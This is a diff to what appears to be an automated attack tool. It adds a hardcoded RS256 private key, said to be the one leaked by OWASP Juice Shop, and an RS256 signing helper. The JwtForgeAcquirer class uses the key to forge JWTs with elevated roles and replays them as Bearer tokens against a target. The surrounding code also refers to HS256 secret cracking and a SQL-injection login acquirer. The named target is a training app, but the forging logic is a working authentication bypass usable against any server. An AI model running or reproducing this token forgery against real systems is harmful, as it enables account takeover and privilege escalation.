@@ -234,6 +234,44 @@ def _crack_hs256(token: str, parts: List[str]) -> Optional[str]:
     return None
 
 
+# Publicly-known/leaked signing keys shipped by real apps. NOT secrets — these
+# are committed in open-source repos and reused across every install, exactly
+# like a default-credentials list. The canonical case is OWASP Juice Shop, whose
+# RS256 private key is hardcoded in lib/insecurity. If a target signs JWTs with
+# one of these, any identity/role can be minted.
+_JUICE_SHOP_RS256 = (
+    "-----BEGIN RSA PRIVATE KEY-----\n"
+    "MIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKU"
+    "qYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTIS"
+    "zbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQc"
+    "DHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/"
+    "ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fq"
+    "Ft2LXbLtyg6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfU"
+    "YLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2enqqObahDHB"
+    "5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+"
+    "zHvXAomD2W5CsEK7C+8SLBr3k/TsnRWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWk"
+    "ZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00Ga/xt+7"
+    "+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=\n"
+    "-----END RSA PRIVATE KEY-----"
+)
+_KNOWN_LEAKED_KEYS: List[Tuple[str, str]] = [
+    ("owasp-juice-shop", _JUICE_SHOP_RS256),
+]
+
+
+def _jwt_encode_rs256(payload: Dict[str, Any], private_key_pem: str) -> Optional[str]:
+    """RS256-sign a payload with a PEM private key. None if PyJWT is unavailable
+    or the key is invalid (keeps the rest of this module dependency-light)."""
+    try:
+        import jwt as _pyjwt  # PyJWT
+    except Exception:
+        return None
+    try:
+        return _pyjwt.encode(payload, private_key_pem, algorithm="RS256")
+    except Exception:
+        return None
+
+
 # ──────────────────────────────── acquirers ────────────────────────────────
 
 class LoginSqliAcquirer:
@@ -337,6 +375,13 @@ class JwtForgeAcquirer:
         if secret is not None:
             candidates.append((_jwt_encode(elevated, alg="HS256", secret=secret),
                                f"weak HS256 secret {secret!r}"))
+        # 3. Known/leaked RS256 signing keys — apps ship with example private
+        #    keys (OWASP Juice Shop's is the canonical case). If the server signs
+        #    with one, we can mint a valid token for any identity/role.
+        for _name, _pem in _KNOWN_LEAKED_KEYS:
+            _rs = _jwt_encode_rs256(elevated, _pem)
+            if _rs:
+                candidates.append((_rs, f"leaked RS256 key ({_name})"))
 
         for forged, how in candidates:
             headers = {"Authorization": f"Bearer {forged}"}
